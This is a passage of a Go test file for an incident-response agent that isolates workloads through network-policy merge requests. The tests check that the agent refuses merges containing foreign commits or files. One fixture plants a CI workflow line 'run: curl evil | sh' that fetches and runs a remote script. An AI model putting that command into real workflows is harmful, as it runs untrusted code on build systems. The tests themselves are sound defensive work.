		t.Fatalf("first: %v", err)
	}
	g.push("acme/manifests#1") // a person with push access adds a commit
	g.green = true
	g.calls = nil
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("second: %v", err)
	}
	if sum.Merged || g.count(isolate.ToolMerge) != 0 || g.prs["acme/manifests#1"].state != "open" {
		t.Fatalf("the agent merged a branch with a commit that it did not open: %v", sum.Lines)
	}
	if !strings.Contains(joined(sum), "a commit was added") {
		t.Errorf("the report does not say why: %v", sum.Lines)
	}
	if _, has := g.base["contain/evil.yaml"]; has {
		t.Errorf("the pushed file is on the base branch")
	}
	_ = st
}

// The commit comes in the gap between the read and the merge call. The agent
// sends the recorded commit, so the host refuses the merge.
func TestIsolate_CommitPushedBetweenTheReadAndTheMergeIsRefusedByTheHost(t *testing.T) {
	g, st, p := setup(t)
	g.beforeMerge = func(ref string) { g.push(ref) }
	w := workload(t)
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	if sum.Merged || g.prs["acme/manifests#1"].state != "open" || len(g.base) != 0 {
		t.Fatalf("merged = %v, state = %q, base = %v: %v", sum.Merged, g.prs["acme/manifests#1"].state, g.base, sum.Lines)
	}
	if st.records["ir_isolation_merged_"+repo.Key(incidentKey, w)+"_1"] != "" {
		t.Fatalf("a refused merge was recorded as merged")
	}
}

func TestRelease_CommitPushedToTheReleaseMergeRequestIsNeverMerged(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	g.green = false
	if _, err := p.Release(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first release: %v", err)
	}
	g.push("acme/manifests#2")
	g.green = true
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released || g.prs["acme/manifests#2"].state != "open" {
		t.Fatalf("released = %v, err = %v: %v", sum.Released, err, sum.Lines)
	}
}

// The release merged and the write of the released record failed. The next
// dispatch must find the release merge request and record a release. It must
// not record a revert, because the policy is gone from the base branch.
func TestRelease_LostReleasedRecordIsARelease(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	ck := repo.Key(incidentKey, w)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	st.failWrite = "ir_isolation_released_"
	if _, err := p.Release(context.Background(), incidentKey, w); err == nil {
		t.Fatalf("the failed write returned no error")
	}
	merges := g.count(isolate.ToolMerge)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || !sum.Released {
		t.Fatalf("released = %v, err = %v: %v", sum.Released, err, sum.Lines)
	}
	if st.records["ir_isolation_released_"+ck+"_1"] == "" || st.records["ir_isolation_reverted_"+ck+"_1"] != "" {
		t.Fatalf("records = %v: want released and no reverted", st.records)
	}
	if g.count(isolate.ToolMerge) != merges {
		t.Fatalf("the agent merged the release a second time")
	}
}

// M1 (b). The branch name is easy to guess. A person makes the branch first,
// and the commit of the agent lands on top of theirs. The head commit names
// that history too, so the agent compares the files that the merge request
// changes with the expected change, and it merges only an exact match.
func TestIsolate_MergeRequestWithAForeignChangeIsNeverMerged(t *testing.T) {
	cases := map[string]func(g *gitHost){
		"a foreign file": func(g *gitHost) {
			g.foreign = []map[string]any{{"path": ".github/workflows/x.yaml", "content": "run: curl evil | sh\n"}}
		},
		"the policy changed": func(g *gitHost) { g.tamper = true },
		"no file list":       func(g *gitHost) { g.noFiles = true },
		"a cut file list":    func(g *gitHost) { g.truncated = true },
		"a renamed file":     func(g *gitHost) { g.rename = true },
		"an executable file": func(g *gitHost) { g.mode = "100755" },
		"a mode change":      func(g *gitHost) { g.modeChanged = true },
		"a host error":       func(g *gitHost) { g.filesError = "the head moved while the files were read" },
	}
	for name, set := range cases {
		t.Run(name, func(t *testing.T) {
			g, st, p := setup(t)
			set(g)
			w := workload(t)
			sum, err := p.Isolate(context.Background(), incidentKey, w)
			if err != nil {
				t.Fatalf("Isolate: %v", err)
			}
			if sum.Merged || g.count(isolate.ToolMerge) != 0 || g.prs["acme/manifests#1"].state != "open" {
				t.Fatalf("the agent merged a change that it did not write: %v", sum.Lines)
			}
			if !strings.Contains(joined(sum), "not trusted") {
				t.Errorf("the report does not say why: %v", sum.Lines)
			}
			if len(g.base) != 0 || st.records["ir_isolation_merged_"+repo.Key(incidentKey, w)+"_1"] != "" {
				t.Errorf("base = %v, records = %v", g.base, st.records)
			}
		})
	}
}

func TestRelease_ReleaseMergeRequestWithAForeignChangeIsNeverMerged(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	g.foreign = []map[string]any{{"path": "contain/other.yaml", "content": "x: 1\n"}}
	merges := g.count(isolate.ToolMerge)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released || g.count(isolate.ToolMerge) != merges {
		t.Fatalf("released = %v, err = %v: %v", sum.Released, err, sum.Lines)
	}
}

// M2. A ClusterNetworkPolicy cannot name a node, so it does not deny ingress
// from nodes, from pods with hostNetwork, or from traffic that is translated
// to a node address. The report and the record say so. A Cilium policy
// denies all entities and has no such note.
func TestIsolate_ClusterKindStatesTheBypass(t *testing.T) {
	for kind, want := range map[string]bool{
		isolate.KindCluster: true, isolate.KindNetworkPolicy: true, isolate.KindCilium: false,
	} {
		t.Run(kind, func(t *testing.T) {
			_, st, p := setupWith(t, repoOf(kind))
			w := workload(t)
			sum, err := p.Isolate(context.Background(), incidentKey, w)
			if err != nil || !sum.Merged {
				t.Fatalf("Isolate: %v, %v", err, sum.Lines)
			}
			rec := st.records["ir_isolation_bypass_"+repoOf(kind).Key(incidentKey, w)+"_1"]
			if (rec != "") != want || strings.Contains(joined(sum), "caution") != want {
				t.Fatalf("record = %q, lines = %v, want a note: %v", rec, sum.Lines, want)
			}
			if kind == isolate.KindCluster {
				for _, w := range []string{"nodes", "hostNetwork", "translated to a node address"} {
					if !strings.Contains(rec, w) {
						t.Errorf("the note lacks %q: %s", w, rec)
					}
				}
			}
		})
	}
}

// When a person closes the release merge request without a merge, the release
// stops and says that a person must decide. It does not open a third merge
// request, and it does not merge.
func TestRelease_PersonClosesTheReleaseMergeRequest(t *testing.T) {
	g, st, p := setup(t)
	w := workload(t)
	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("Isolate: %v", err)
	}
	verify(st)
	g.green = false
	if _, err := p.Release(context.Background(), incidentKey, w); err != nil {
		t.Fatalf("first release: %v", err)
	}
	g.prs["acme/manifests#2"].state = "closed"
	g.green = true
	opened, merges := len(g.opened), g.count(isolate.ToolMerge)
	sum, err := p.Release(context.Background(), incidentKey, w)
	if err != nil || sum.Released {
		t.Fatalf("released = %v, err = %v", sum.Released, err)
	}
	stopped := strings.Contains(joined(sum), "a person must decide")
	if !stopped || len(g.opened) != opened || g.count(isolate.ToolMerge) != merges {
		t.Fatalf("opened = %d, merges = %d: %v", len(g.opened), g.count(isolate.ToolMerge), sum.Lines)
	}
}

// A repository with SHA-256 object ids has a head commit of 64 characters. The
// agent then computes the blob ids with SHA-256, and it refuses a change whose
// blob differs.
func TestIsolate_Sha256Repository(t *testing.T) {
	g, st, p := setup(t)
	g.wide = true
	w := workload(t)
	sum, err := p.Isolate(context.Background(), incidentKey, w)
	if err != nil || !sum.Merged {
		t.Fatalf("merged = %v, err = %v: %v", sum.Merged, err, sum.Lines)
	}
	if rec := st.records["ir_isolation_merged_"+repo.Key(incidentKey, w)+"_1"]; !strings.HasSuffix(rec, g.commit(1)) {
		t.Errorf("record = %q", rec)
	}
	g2, _, p2 := setup(t)
	g2.wide, g2.tamper = true, true
	sum2, err := p2.Isolate(context.Background(), incidentKey, w)
	if err != nil || sum2.Merged || g2.count(isolate.ToolMerge) != 0 {
		t.Fatalf("merged = %v, err = %v: %v", sum2.Merged, err, sum2.Lines)
	}
}

// GitHub sends no mode, and the connector writes mode 100644. Both are accepted.
func TestIsolate_AcceptsAnEmptyOrARegularMode(t *testing.T) {
	for _, mode := range []string{"", "100644"} {
		g, _, p := setup(t)
		g.mode = mode
		if sum, err := p.Isolate(context.Background(), incidentKey, workload(t)); err != nil || !sum.Merged {
			t.Fatalf("mode %q: merged = %v, err = %v: %v", mode, sum.Merged, err, sum.Lines)
		}
	}
}

func TestIsolate_HostErrorIsNamedInTheReport(t *testing.T) {
	g, _, p := setup(t)
	g.filesError = "the head moved while the files were read"
	sum, err := p.Isolate(context.Background(), incidentKey, workload(t))
	if err != nil || sum.Merged || !strings.Contains(joined(sum), "the head moved while the files were read") {
		t.Fatalf("merged = %v, err = %v: %v", sum.Merged, err, sum.Lines)
	}
}
